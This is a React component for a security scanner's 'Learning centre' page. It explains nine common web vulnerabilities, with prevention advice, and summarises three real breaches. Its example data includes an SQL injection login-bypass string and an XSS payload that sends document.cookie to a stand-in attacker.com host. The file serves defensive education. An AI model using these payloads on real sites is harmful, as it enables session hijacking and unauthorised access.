import React, { useEffect, useMemo, useState } from 'react';
import { Link, useLocation } from 'react-router-dom';

export default function Vulnerabilities() {
  const [expandedCard, setExpandedCard] = useState(null);
  const [activeTab, setActiveTab] = useState('vulnerabilities');
  const [imageAttempts, setImageAttempts] = useState(() => ({}));
  const location = useLocation();

  const headerArt = useMemo(
    () => ({
      sqli: { from: 'from-red-500/25', to: 'to-amber-500/10' },
      xss: { from: 'from-amber-500/25', to: 'to-purple-500/10' },
      access_control: { from: 'from-purple-500/25', to: 'to-blue-500/10' },
      headers: { from: 'from-blue-500/25', to: 'to-emerald-500/10' },
      cookies: { from: 'from-emerald-500/25', to: 'to-blue-500/10' },
      error: { from: 'from-slate-500/25', to: 'to-red-500/10' },
      rate_limit: { from: 'from-blue-500/20', to: 'to-slate-500/10' },
      subdomain: { from: 'from-emerald-500/20', to: 'to-slate-500/10' },
      logging: { from: 'from-slate-500/25', to: 'to-slate-500/10' },
    }),
    []
  );

  const vulnerabilities = [
    {
      id: 1,
      slug: 'sqli',
      name: 'SQL Injection',
      severity: 'Critical',
      shortDesc: 'Untrusted input is turned into raw SQL and executed by the database.',
      humanDesc:
        'SQL injection lets an attacker change the meaning of a database query by injecting special characters or SQL keywords into fields such as login forms and search boxes.',
      realExample:
        `A login form builds SQL like \`SELECT * FROM users WHERE email = 'input' AND password = 'input'\` instead of using parameters. The input '' OR 1=1 -- logs in as the first user.`,
      prevention:
        'Use parameterised queries / prepared statements, never concatenate user input into SQL, and apply server-side input validation.'
    },
    {
      id: 2,
      slug: 'xss',
      name: 'Cross-Site Scripting (XSS)',
      severity: 'High',
      shortDesc: 'Attacker-controlled JavaScript is executed in other users’ browsers.',
      humanDesc:
        'XSS occurs when untrusted data is echoed into HTML without proper encoding. It allows attackers to run scripts in a victim’s browser, often to steal cookies or hijack sessions.',
      realExample:
        'A comment field allows raw HTML. An attacker posts `<script>fetch("https://attacker.com/cookie?c=" + document.cookie)</script>` which runs for anyone viewing the comments.',
      prevention:
        'Encode untrusted data before rendering, sanitise user input, and consider a strict Content-Security-Policy to limit where scripts can load from.'
    },
    {
      id: 3,
      slug: 'access_control',
      name: 'Broken Access Control',
      severity: 'Critical',
      shortDesc: 'Users can access data or functions that should be restricted.',
      humanDesc:
        'Broken access control happens when the application does not reliably check whether a user is allowed to access a resource or perform an action, especially when IDs are guessable.',
      realExample:
        'A user profile endpoint at `/api/users/1` is accessible by changing the URL to `/api/users/2`, exposing another user’s data without additional checks.',
      prevention:
        'Enforce authorisation checks on every request, use server-side access control rules, and avoid exposing raw IDs that can be easily enumerated.'
    },
    {
      id: 4,
      slug: 'headers',
      name: 'Missing Security Headers',
      severity: 'Medium',
      shortDesc: 'Important browser security features are disabled by default.',
      humanDesc:
        'Modern browsers rely on HTTP headers such as Content-Security-Policy, X-Frame-Options, X-Content-Type-Options and Strict-Transport-Security to enable defence-in-depth at the browser level.',
      realExample:
        'An application served over HTTPS omits HSTS and CSP. A network attacker can downgrade users to HTTP and inject scripts that would have been blocked with stricter headers.',
      prevention:
        'Configure standard security headers at your reverse proxy or application server. Start with conservative defaults and tighten them as you test.'
    },
    {
      id: 5,
      slug: 'cookies',
      name: 'Insecure Session Cookies',
      severity: 'High',
      shortDesc: 'Session identifiers can be read or sent over insecure channels.',
      humanDesc:
        'If session cookies are missing HttpOnly, Secure or SameSite protections, they can be read by injected scripts or sent over unencrypted connections, increasing the impact of other bugs.',
      realExample:
        'A `sessionid` cookie is set without HttpOnly or Secure. A simple XSS bug can then read the cookie and send it to an attacker, who replays it to hijack the account.',
      prevention:
        'Mark session cookies as HttpOnly and Secure, choose an appropriate SameSite mode, and never expose session identifiers to client-side JavaScript unless strictly necessary.'
    },
    {
      id: 6,
      slug: 'error',
      name: 'Verbose Error Messages',
      severity: 'Medium',
      shortDesc: 'Stack traces and internal details are shown to end users.',
      humanDesc:
        'Detailed error messages can reveal framework versions, file paths and SQL fragments. Attackers use this information to fine-tune their inputs and build exploit chains.',
      realExample:
        'A bad request causes the application to render a full stack trace including internal function names and SQL queries on the public site.',
      prevention:
        'Return generic error messages to the browser, log detailed information server-side, and ensure production builds do not enable debug error pages.'
    },
    {
      id: 7,
      slug: 'rate_limit',
      name: 'Missing Rate Limiting',
      severity: 'Medium',
      shortDesc: 'Sensitive endpoints accept unlimited repeated attempts.',
      humanDesc:
        'Without any throttling or rate limiting, attackers can send thousands of login attempts or password reset requests without triggering alerts or controls.',
      realExample:
        'A login endpoint returns generic “Invalid credentials” but allows unlimited requests from the same IP, making brute-force attacks easier.',
      prevention:
        'Introduce rate limiting or throttling for endpoints such as login, registration and password reset. Monitor for unusual patterns and add captchas only where necessary.'
    },
    {
      id: 8,
      slug: 'subdomain',
      name: 'Exposed Subdomains',
      severity: 'Low',
      shortDesc: 'Forgotten test or staging systems are still reachable on the internet.',
      humanDesc:
        'Subdomains like dev, test or staging often host older builds with weaker controls. If they are left exposed, attackers can target them to pivot into production.',
      realExample:
        'A `dev.example.com` host is indexed by search engines and runs an outdated version of the application with verbose errors and default credentials.',
      prevention:
        'Maintain an inventory of subdomains, retire or lock down anything that is not meant to be public, and avoid reusing production data on test instances.'
    },
    {
      id: 9,
      slug: 'logging',
      name: 'Insufficient Logging & Monitoring',
      severity: 'Low',
      shortDesc: 'Incidents go unnoticed because there is no visibility.',
      humanDesc:
        'If authentication failures, access control violations and key configuration changes are not logged and reviewed, attacks can succeed quietly and persist over time.',
      realExample:
        'An attacker spends days guessing passwords. Because failed logins are not logged centrally and no alerts are configured, the behaviour is never reviewed.',
      prevention:
        'Log security-relevant events, send them to a central location, and define alerts for patterns such as high failure rates or access from unusual locations.'
    }
  ];

  const breaches = [
    {
      name: 'Kenya Airways (2023)',
      affected: 'Passenger and staff data',
      type: 'Ransomware',
      impact: 'Service disruption and data exposure',
      description:
        'Kenya Airways reported a ransomware incident that disrupted services and led to a data breach impacting passenger and staff information.'
    },
    {
      name: 'Equifax (2017)',
      affected: '147M users',
      type: 'Injection & Unpatched Software',
      impact: '$700M+ fines and remediation',
      description:
        'Sensitive personal data was exposed after attackers exploited an unpatched component and moved laterally inside the network.'
    },
    {
      name: 'Yahoo (2013–2014)',
      affected: '3B accounts',
      type: 'Weak Authentication & Monitoring',
      impact: 'Significant valuation impact',
      description:
        'Passwords and personal details were exposed at massive scale, and the breaches went undetected for a long period.'
    }
  ];

  const toggleCard = (id) => setExpandedCard((prev) => (prev === id ? null : id));

  useEffect(() => {
    if (!location.hash) return;
    const hash = location.hash.replace('#', '');
    const match = vulnerabilities.find((v) => v.slug === hash);
    if (!match) return;
    setExpandedCard(match.id);
    const el = document.getElementById(match.slug);
    if (el) {
      el.scrollIntoView({ behavior: 'smooth', block: 'start' });
    }
  }, [location.hash]);

  const severityBadge = (sev) => {
    const base = 'inline-flex items-center px-2 py-0.5 rounded-full text-xs font-semibold border';
    if (sev === 'Critical') return `${base} bg-purple-500/15 text-purple-400 border-purple-500/25`;
    if (sev === 'High') return `${base} bg-red-500/15 text-red-400 border-red-500/25`;
    if (sev === 'Medium') return `${base} bg-amber-500/15 text-amber-400 border-amber-500/25`;
    if (sev === 'Low') return `${base} bg-teal-500/15 text-teal-400 border-teal-500/25`;
    return `${base} bg-slate-500/15 text-slate-400 border-slate-500/25`;
  };

  const onHeaderImageError = (slug) => {
    const candidates = ['png', 'jpg', 'jpeg'];

    setImageAttempts((prev) => {
      const current = prev[slug] ?? 0;
      const nextAttempt = current + 1;
      if (nextAttempt >= candidates.length) {
        return { ...prev, [slug]: -1 };
      }
      return { ...prev, [slug]: nextAttempt };
    });
  };

  return (
    <div className="max-w-6xl mx-auto">
      <div className="rounded-2xl border border-slate-800 bg-dark-200 p-6 sm:p-8 overflow-hidden relative">
        <div className="absolute inset-0 bg-gradient-to-r from-primary-500/15 to-secondary-500/10 dark:from-primary-500/20 dark:to-secondary-500/15" />
        <div className="absolute -top-24 -right-24 w-[340px] h-[340px] rounded-full bg-primary-500/10 blur-3xl" />
        <div className="absolute -bottom-28 -left-28 w-[360px] h-[360px] rounded-full bg-secondary-500/10 blur-3xl" />

        <div className="relative flex flex-col md:flex-row md:items-end md:justify-between gap-5">
          <div>
            <h1 className="text-3xl font-bold bg-gradient-to-r from-primary-400 to-secondary-400 bg-clip-text text-transparent">Learning centre</h1>
            <p className="text-sm text-gray-500 mt-2 max-w-2xl">
              Short, practical notes on common web issues and a few real-world incidents.
            </p>
            <p className="text-xs text-gray-500 mt-2 max-w-2xl">
              Tip: add header images in <span className="font-mono">frontend/public/learn</span>.
              Name them like <span className="font-mono">sqli.png</span> (or <span className="font-mono">.jpg</span>/<span className="font-mono">.jpeg</span>).
            </p>
          </div>

          <div className="flex flex-wrap gap-2">
            <TabButton active={activeTab === 'vulnerabilities'} onClick={() => setActiveTab('vulnerabilities')}>
              Vulnerabilities
            </TabButton>
            <TabButton active={activeTab === 'breaches'} onClick={() => setActiveTab('breaches')}>
              Incidents
            </TabButton>
            <Link to="/new" className="btn btn-primary text-sm px-4 py-2">
              New scan
            </Link>
          </div>
        </div>
      </div>

      {activeTab === 'vulnerabilities' && (
        <div className="mt-6 space-y-4">
          <div className="rounded-xl border border-slate-800 bg-dark-200 p-5">
            <h2 className="text-sm font-semibold text-gray-200">Common web vulnerabilities</h2>
            <p className="text-sm text-gray-500 mt-2">
              Click a card to expand: what it is, what it looks like, and how to reduce the risk.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {vulnerabilities.map((v) => {
              const art = headerArt[v.slug] || { from: 'from-primary-500/20', to: 'to-secondary-500/10' };
              const candidates = ['png', 'jpg', 'jpeg'];
              const attempt = imageAttempts[v.slug] ?? 0;
              const showImage = attempt !== -1;
              const imageUrl = showImage ? `/learn/${v.slug}.${candidates[attempt]}` : '';

              const expanded = expandedCard === v.id;

              return (
                <article
                  key={v.id}
                  id={v.slug}
                  className="rounded-xl border border-slate-800 bg-dark-200 overflow-hidden transition hover:border-primary-500/30"
                >
                  <div className="relative h-20 sm:h-24 w-full overflow-hidden border-b border-slate-800">
                    {showImage && (
                      <img
                        src={imageUrl}
                        alt=""
                        className="absolute inset-0 h-full w-full object-cover opacity-80 dark:opacity-60"
                        onError={() => onHeaderImageError(v.slug)}
                        loading="lazy"
                      />
                    )}
                    <div className={`absolute inset-0 bg-gradient-to-r ${art.from} ${art.to}`} />
                    <div
                      className="absolute inset-0 opacity-80 dark:opacity-60"
                      style={{
                        backgroundImage:
                          'radial-gradient(circle at 15% 10%, rgba(255,255,255,0.14), transparent 50%), radial-gradient(circle at 85% 0%, rgba(255,255,255,0.10), transparent 55%)',
                      }}
                    />
                  </div>

                  <button
                    type="button"
                    onClick={() => toggleCard(v.id)}
                    className="w-full text-left p-5 flex items-start justify-between gap-4"
                  >
                    <div>
                      <h3 className="text-sm font-semibold text-gray-200">{v.name}</h3>
                      <p className="mt-1 text-xs text-gray-500">{v.shortDesc}</p>
                    </div>
                    <span className={severityBadge(v.severity)}>{v.severity}</span>
                  </button>

                  {expanded && (
                    <div className="px-5 pb-5 border-t border-slate-800 animate-slide-up">
                      <div className="pt-4 space-y-4">
                        {showImage && imageUrl ? (
                          <div className="rounded-lg border border-slate-800 bg-black/5 dark:bg-black/25 overflow-hidden">
                            <img
                              src={imageUrl}
                              alt=""
                              className="w-full max-h-72 object-contain bg-black/5 dark:bg-black/40"
                              onError={() => onHeaderImageError(v.slug)}
                              loading="lazy"
                            />
                          </div>
                        ) : null}

                        <LearnSection title="How it works">{v.humanDesc}</LearnSection>
                        <LearnSection title="How to reduce the risk">{v.prevention}</LearnSection>
                      </div>
                    </div>
                  )}
                </article>
              );
            })}
          </div>
        </div>
      )}

      {activeTab === 'breaches' && (
        <div className="mt-6 space-y-4">
          <div className="rounded-xl border border-slate-800 bg-dark-200 p-5">
            <h2 className="text-sm font-semibold text-gray-200">Security incidents in the real world</h2>
            <p className="text-sm text-gray-500 mt-2">
              These examples help you connect scan findings to real consequences.
            </p>
          </div>

          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            {breaches.map((b, i) => (
              <article key={i} className="rounded-xl border border-slate-800 bg-dark-200 p-5 flex flex-col gap-3">
                <div className="flex items-start justify-between gap-3">
                  <div>
                    <h3 className="text-sm font-semibold text-gray-200">{b.name}</h3>
                    <p className="text-xs text-gray-500 mt-1">{b.affected} • {b.impact}</p>
                  </div>
                  <span className="inline-flex items-center px-2 py-0.5 rounded-full text-xs font-semibold bg-slate-500/10 text-gray-400 border border-slate-800">
                    {b.type}
                  </span>
                </div>

                <p className="text-sm text-gray-500 leading-relaxed">{b.description}</p>
              </article>
            ))}
          </div>
        </div>
      )}
    </div>
  );
}

function TabButton({ active, onClick, children }) {
  return (
    <button
      type="button"
      onClick={onClick}
      className={`px-3 py-2 rounded-full text-sm font-medium border transition ${
        active
          ? 'bg-primary-500/15 text-primary-400 border-primary-500/25'
          : 'bg-slate-500/10 text-gray-400 border-slate-800 hover:bg-black/5 dark:hover:bg-slate-800'
      }`}
    >
      {children}
    </button>
  );
}

function LearnSection({ title, children }) {
  return (
    <section>
      <h4 className="text-xs font-semibold text-primary-400 uppercase tracking-wide mb-2">{title}</h4>
      <div className="text-sm text-gray-300 leading-relaxed">{children}</div>
    </section>
  );
}